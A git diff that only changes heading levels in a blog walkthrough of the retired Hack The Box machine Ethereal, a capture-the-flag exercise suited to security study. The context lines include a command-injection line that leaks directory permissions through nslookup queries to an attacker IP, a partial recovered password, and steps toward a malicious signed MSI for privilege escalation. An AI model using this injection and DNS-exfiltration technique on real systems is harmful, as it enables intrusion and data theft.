@@ -17,11 +17,11 @@ This post documents the complete walkthrough of Ethereal, a retired vulnerable [
 
 <!--more-->
 
-### Background
+## Background
 
 Ethereal is a retired vulnerable VM from Hack The Box.
 
-### Information Gathering
+## Information Gathering
 
 Let’s start with a `masscan` probe to establish the open ports in the host.
 
@@ -71,7 +71,7 @@ The file contains a FAT filesystem that we can mount like so.
 ![a3c74dd3.png](/assets/images/posts/ethereal-htb-walkthrough/a3c74dd3.png)
 </a>
 
-### PasswordBox
+## PasswordBox
 
 The directory `pbox` contains a MS-DOS executable `PBOX.EXE`, i.e. PasswordBox [program](https://sourceforge.net/projects/passwbox/).
 
@@ -101,7 +101,7 @@ To make things easier for copying, you can also run `PBOX.EXE` with the `--dump`
 ![3bb1590a.png](/assets/images/posts/ethereal-htb-walkthrough/3bb1590a.png)
 </a>
 
-### Internet Information Services (IIS)
+## Internet Information Services (IIS)
 
 Now, let's turn our attention to the `http` services, `80/tcp` and `8080/tcp`. This is how `80/tcp` looks like.
 
@@ -139,7 +139,7 @@ Recall the credentials we collected earlier? Turns out that (`alan:!C414m17y57r1
 ![4c9e5bee.png](/assets/images/posts/ethereal-htb-walkthrough/4c9e5bee.png)
 </a>
 
-### Test Connection
+## Test Connection
 
 This is how it looks like after logging in.
 
@@ -236,7 +236,7 @@ _Check access control list of files/directories_
 & for /f "tokens=1-10*" %i in ('icacls c:\users\public\desktop\shortcuts') do nslookup %i_%j_%k_%l_%m_%o_%p_%q 10.10.13.92
 ```
 
-### Data Exfiltration
+## Data Exfiltration
 
 Running the command to ***display outbound firewall rules*** reveals the following:
 
@@ -321,7 +321,7 @@ Going deeper into the OpenSSL directory reveals the `openssl.exe` binary.
 ![d87da0ed.png](/assets/images/posts/ethereal-htb-walkthrough/d87da0ed.png)
 </a>
 
-### Remote Command Execution
+## Remote Command Execution
 
 We have two TCP ports allowed for outbound communications and there's OpenSSL available. Perhaps we can create an encrypted tunnel for shuttling data back and forth between the box and my attacking machine?
 
@@ -447,7 +447,7 @@ Please drop MSIs that need testing into this folder - I will review regularly. C
 
 What now? Create malicious signed MSI? Challenge accepted. :triumph:
 
-### Privilege Escalation
+## Privilege Escalation
 
 I'm using WiX Toolset to create the malicious MSI, and `signtool` from Windows SDK to sign it. Having said that, the instructions to install and configure them is beyond the scope of this walkthrough. I'll leave you with an exercise to extract the CA certificate and private key from `D:\Certs`. **Hint**: use `openssl base64`.
 
